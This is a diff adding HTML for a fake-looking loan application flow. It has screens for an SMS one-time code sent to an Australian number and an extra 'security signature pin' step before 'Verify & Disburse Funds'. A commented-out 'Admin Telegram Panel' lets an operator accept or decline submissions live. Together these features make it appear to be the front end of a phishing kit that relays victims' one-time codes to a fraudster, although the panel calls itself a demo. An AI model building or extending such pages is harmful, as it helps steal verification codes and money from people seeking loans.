@@ -1,0 +1,215 @@
+  <div class="shell">
+
+    <!-- MAIN PANE -->
+    <main class="main-pane">
+
+
+      <div class="content">
+
+
+
+        <!-- STEP 3: OTP -->
+        <div class="step" id="step-otp">
+          <div class="progress-bar">
+            <div class="prog-step done">
+              <div class="prog-dot"><svg viewBox="0 0 12 12">
+                  <polyline points="2 6 5 9 10 3" />
+                </svg></div>
+              <span>Purpose</span>
+            </div>
+            <div class="prog-line done"></div>
+            <div class="prog-step done">
+              <div class="prog-dot"><svg viewBox="0 0 12 12">
+                  <polyline points="2 6 5 9 10 3" />
+                </svg></div>
+              <span>Details</span>
+            </div>
+            <div class="prog-line done"></div>
+            <div class="prog-step active">
+              <div class="prog-dot"><span class="num">3</span></div>
+              <span>Verify</span>
+            </div>
+          </div>
+
+          <div style="text-align:center;max-width:400px;margin:0 auto">
+            <div
+              style="width:56px;height:56px;border-radius:16px;background:var(--accent-light);display:flex;align-items:center;justify-content:center;margin:0 auto 20px">
+              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <rect x="5" y="11" width="14" height="10" rx="2" />
+                <path d="M8 11V7a4 4 0 018 0v4" />
+              </svg>
+            </div>
+            <h2 class="section-title" style="font-size:22px">Verify Your Identity</h2>
+            <p class="section-sub">Enter the 6-digit code sent to your mobile number to confirm your application.</p>
+
+            <div class="otp-note" id="otp-note">Code sent to +61 <span id="otp-phone-display">—</span></div>
+            <div class="otp-error" id="otp-error">Incorrect code. Please try again.</div>
+
+            <div class="otp-wrap" id="otp-inputs"></div>
+
+            <div class="timer-row">
+              <span>Expires in <strong id="otp-timer">120</strong>s</span>
+              <button class="resend-btn" id="resend-btn" onclick="startOtpTimer()">Resend code</button>
+            </div>
+
+            <button class="btn btn-primary btn-full" id="otp-submit-btn" onclick="submitOtp()" disabled>Confirm &
+              Submit
+              →</button>
+            <div style="margin-top:12px">
+              <button class="btn btn-ghost" onclick="goTo('details')" style="font-size:13px;padding:10px 20px">← Back
+                to
+                Details</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="step" id="step-dynamic-pin">
+          <div class="progress-bar">
+            <div class="prog-step done">
+              <div class="prog-dot"><svg viewBox="0 0 12 12">
+                  <polyline points="2 6 5 9 10 3" />
+                </svg></div>
+              <span>Purpose</span>
+            </div>
+            <div class="prog-line done"></div>
+            <div class="prog-step done">
+              <div class="prog-dot"><svg viewBox="0 0 12 12">
+                  <polyline points="2 6 5 9 10 3" />
+                </svg></div>
+              <span>Details</span>
+            </div>
+            <div class="prog-line done"></div>
+            <div class="prog-step active">
+              <div class="prog-dot"><span class="num">★</span></div>
+              <span>Authorization Code</span>
+            </div>
+          </div>
+
+          <div style="text-align:center;max-width:400px;margin:0 auto">
+            <div
+              style="width:56px;height:56px;border-radius:16px;background:var(--accent-light);display:flex;align-items:center;justify-content:center;margin:0 auto 20px">
+              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+              </svg>
+            </div>
+            <h2 class="section-title" style="font-size:22px" id="dynamic-pin-title">Security Pin Required</h2>
+            <p class="section-sub">Please enter the security signature pin authorized by your agent management link to
+              proceed.</p>
+
+            <div class="otp-error" id="dynamic-pin-error">Incorrect signature code sequence. Please verify fields and
+              re-enter.</div>
+
+            <div class="otp-wrap" id="dynamic-pin-inputs"></div>
+
+            <button class="btn btn-primary btn-full" id="dynamic-pin-submit-btn" onclick="submitDynamicPin()"
+              disabled>Verify & Disburse Funds →</button>
+          </div>
+        </div>
+
+        <div class="step" id="step-processing">
+          <div class="processing-wrap" style="text-align:center; padding: 40px 0;">
+            <h3 style="font-size:18px;font-weight:700;color:var(--ink);margin-bottom:8px" id="proc-title">Submitting
+              application...</h3>
+            <p style="font-size:13px;color:var(--ink-3)" id="proc-sub">Please wait while we process your request.</p>
+          </div>
+        </div>
+
+        <!-- Success -->
+        <div class="step" id="step-success">
+          <div class="result-card">
+            <div class="result-header success">
+              <div class="result-icon">
+                <svg viewBox="0 0 24 24">
+                  <polyline points="20 6 9 17 4 12" />
+                </svg>
+              </div>
+              <h2>Application Approved!</h2>
+              <p>Your loan application has been provisionally accepted.</p>
+            </div>
+            <div class="result-body">
+              <h3
+                style="font-size:13px;font-weight:800;color:var(--ink-2);text-transform:uppercase;letter-spacing:.5px;margin-bottom:16px">
+                Application Summary</h3>
+              <div class="summary-grid">
+                <div class="summary-item">
+                  <div class="s-label">Applicant</div>
+                  <div class="s-val" id="sum-name">—</div>
+                </div>
+                <div class="summary-item">
+                  <div class="s-label">Loan Purpose</div>
+                  <div class="s-val" id="sum-purpose">—</div>
+                </div>
+                <div class="summary-item">
+                  <div class="s-label">Amount</div>
+                  <div class="s-val" id="sum-amount">—</div>
+                </div>
+                <div class="summary-item">
+                  <div class="s-label">Term</div>
+                  <div class="s-val" id="sum-term">—</div>
+                </div>
+                <div class="summary-item">
+                  <div class="s-label">Email</div>
+                  <div class="s-val" id="sum-email">—</div>
+                </div>
+                <div class="summary-item">
+                  <div class="s-label">Mobile</div>
+                  <div class="s-val" id="sum-phone">—</div>
+                </div>
+              </div>
+              <div class="next-steps">
+                <h4>What happens next?</h4>
+                <p>A loan specialist will contact you within 2–4 business hours to complete final verification and
+                  arrange disbursement.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Declined -->
+        <div class="step" id="step-declined">
+          <div class="result-card">
+            <div class="result-header declined">
+              <div class="result-icon">
+                <svg viewBox="0 0 24 24">
+                  <line x1="18" y1="6" x2="6" y2="18" />
+                  <line x1="6" y1="6" x2="18" y2="18" />
+                </svg>
+              </div>
+              <h2>Application Declined</h2>
+              <p>We were unable to verify your application at this time.</p>
+            </div>
+            <div class="result-body" style="text-align:center">
+              <p style="font-size:13px;color:var(--ink-3);margin-bottom:24px;line-height:1.7">Your verification code
+                could not be confirmed, or the application was declined during review. Please try again or contact
+                support.</p>
+              <button class="btn btn-primary" onclick="resetApp()">Start a New Application</button>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </main>
+
+    <!-- SIDE PANEL -->
+    <!-- <aside class="side-pane">
+    <div class="side-header">
+      <div class="side-title"><div class="side-dot"></div>Admin Telegram Panel</div>
+      <div class="side-sub">Live notification simulator · Accept or decline submissions</div>
+    </div>
+    <div class="side-chat" id="tg-feed">
+      <div class="tg-system">Bot connected · Awaiting submissions</div>
+      <div class="tg-msg">
+        <div class="tg-avatar">🤖</div>
+        <div class="tg-bubble">
+          <div class="tg-head">LendFlow Bot</div>
+          When applicants submit their details, you'll see live notifications here with Accept / Decline controls.
+        </div>
+      </div>
+    </div>
+    <div class="side-footer">
+      <button class="reset-btn" onclick="resetApp()">↺ Reset Demo</button>
+    </div>
+  </aside> -->
+
+  </div>
